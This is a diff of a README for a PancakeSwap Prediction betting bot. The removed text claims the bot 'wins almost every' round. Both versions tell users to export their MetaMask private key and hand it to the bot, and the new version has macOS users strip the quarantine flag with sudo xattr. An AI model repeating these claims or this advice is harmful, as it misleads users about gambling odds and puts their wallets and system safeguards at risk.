@@ -1,70 +1,94 @@
-<a href="https://chrome.google.com/webstore/detail/pancakeswap-prediction-wi/nklhnifmhokmlmkodhfcdkhfpepdfpng" >
+<p align="center">
+<img height="256" src="./src-tauri/icons/Square310x310Logo.png" />
+</p>
 
-<img src="ppw-image.png" width="100%" alt="PancakeSwap Prediction Winner" />
+<h1 align="center">Pancake Wizard</h1>
 
-</a>
+<p align="center">Bot for Pancake Prediction – 26 technical indicators. Make smarter predictions with Pancake Wizard – trust math, not emotions!</p>
 
-<a href="https://chrome.google.com/webstore/detail/pancakeswap-prediction-wi/nklhnifmhokmlmkodhfcdkhfpepdfpng" >
+<p align=center>
+<a href="https://github.com/modagavr/pancake-wizard/releases/latest">Download</a> ·
+<a href="https://t.me/PancakeWizard">Telegram Group</a>
+</p>
 
-<img src="ppw-image-notice.png" width="100%" alt="PancakeSwap Prediction Winner" />
+---
 
-</a>
+## Features
 
-<a href="https://t.me/PancakeWizard" >
+* 26 technical indicators
+* Math-based analysis, not emotional decision-making
+* Auto-bet
+* Auto-claim
+* User-friendly interface
+* Desktop notifications
+* Fast and lightweight
 
-<img src="ppw-image-telegram.png" width="100%" alt="PancakeSwap Prediction Winner" />
+<img src="./images/pancake-wizard-screenshot-1.png" />
 
-</a>
+## Download
 
-#### PancakeSwap is afraid of this! This bot is a casino winner! This bot wins almost every 5 minute BNB-USD option on PancakeSwap Prediction and DogeBets. Supports all modern browsers. Secured by default.
+### Download the bot here [Windows / Linux / macOS](https://github.com/modagavr/pancake-wizard/releases/latest).
 
-#### IMPORTANT! Open Extensions -> Developer Mode ON -> PancakeSwap Prediction Winner -> service worker. Otherwise the bot will sleep.
+Note (macOS). If it shows that the app is broken do this:
 
-## 💡 Quick Start
-
-The fastest way to start with the bot is the Chrome Extension version.
-
-- Go to [Extension Page](https://chrome.google.com/webstore/detail/pancakeswap-prediction-wi/nklhnifmhokmlmkodhfcdkhfpepdfpng) and install the bot
-
-- Enter your private key and bet amount and click "Set" button. Your private key is **securely** stored on your local machine.
-
-- Choose PancakeSwap or DogeBets at the bottom of the bot
-
-- Click "Start The Bot" and just wait. Bot will do everything automatically. He will even collect the awards himself.
-
-- You can use any site, most importantly, do not make any transactions, because you can break the bot timer
+1. Install `Pancake Wizard` the normal way by moving it to `Applications` folder
+2. Open Terminal app
+3. Run 
+```console
+sudo xattr -r -d com.apple.quarantine /Applications/Pancake\ Wizard.app
+```
+4. Press `Enter`
+5. Enter password and press `Enter`
+6. Use the bot
 
 ### 🦊 How to Export Private Key from MetaMask
-
 - Open your account
 - Click on three points at top-right corner
 - Account details
 - Export Private Key
 
-https://user-images.githubusercontent.com/49167406/133898611-81375fb7-bf3e-4571-9848-9b2447b57eee.mp4
+## Technical Indicators Used
+| Oscillators                        |
+|------------------------------------|
+| Relative Strength Index (14)       |
+| Stochastic %K (14, 3, 3)           |
+| Commodity Channel Index (20)       |
+| Average Directional Index (14)     |
+| Awesome Oscillator                 |
+| Momentum (10)                      |
+| MACD Level (12, 26)                |
+| Stochastic RSI Fast (3, 3, 14, 14) |
+| Williams Percent Range (14)        |
+| Bull Bear Power                    |
+| Ultimate Oscillator (7, 14, 28)    |
 
-![alt PancakeSwap Prediction Bot-Winner Screenshot](ppw-image-2.png)
-![alt CandleGenie Bot-Winner Screenshot](ppw-image-3.png)
+| Moving Averages                     |
+|-------------------------------------|
+| Exponential Moving Average (10)     |
+| Simple Moving Average (10)          |
+| Exponential Moving Average (20)     |
+| Simple Moving Average (20)          |
+| Exponential Moving Average (30)     |
+| Simple Moving Average (30)          |
+| Exponential Moving Average (50)     |
+| Simple Moving Average (50)          |
+| Exponential Moving Average (100)    |
+| Simple Moving Average (100)         |
+| Exponential Moving Average (200)    |
+| Simple Moving Average (200)         |
+| Ichimoku Base Line (9, 26, 52, 26)  |
+| Volume Weighted Moving Average (20) |
+| Hull Moving Average (9)             |
 
-### If you want to run CLI instead of extension
 
-1. Copy **.env.example** to **.env** `cp .env.example .env`
-2. Provide your private key to **.env** PRIVATE_KEY field
-3. Install dependencies `npm i` or `yarn`
-4. Start THIS BEAST `npm run start` or `yarn start`
+## Contributing
 
-- For DogeBets `npm run doge` or `yarn doge`
-- For Experimental Strategy add `--exp` flag
+Pancake Wizard is always looking for contributions, whether it's through bug reports, code, or new translations.
 
-### Feel free to contribute. Good Luck!
+* If you find a bug in Pancake Wizard, or would like to suggest a new feature or enhancement, it'd be nice if you could [search your problem first](https://github.com/modagavr/pancake-wizard/issues); while i don't mind duplicates, keeping issues unique helps me save time and consolidates effort. If you can't find your issue, feel free to [file a new one](https://github.com/modagavr/pancake-wizard/issues/new).
 
-## 💥 Disclaimer
+* Standard Plan includes plain 0.003 BNB fee **only from profits**
 
-Every time the bot wins, it donates a small portion of your winnings to the ingenious developer of this victorious bot so that he can have a delicious meal for dinner❤️
+## Download the bot here [Windows / Linux / macOS](https://github.com/modagavr/pancake-wizard/releases/latest).
 
-All investment strategies and investments involve risk of loss.
-**Nothing contained in this program, scripts, code or repository should be construed as investment advice.**
-Any reference to an investment's past or potential performance is not,
-and should not be construed as, a recommendation or as a guarantee of
-any specific outcome or profit.
-By using this program you accept all liabilities, and that no claims can be made against the developers or others connected with the program.
+## Telegram Group [@PancakeWizard](https://t.me/PancakeWizard)
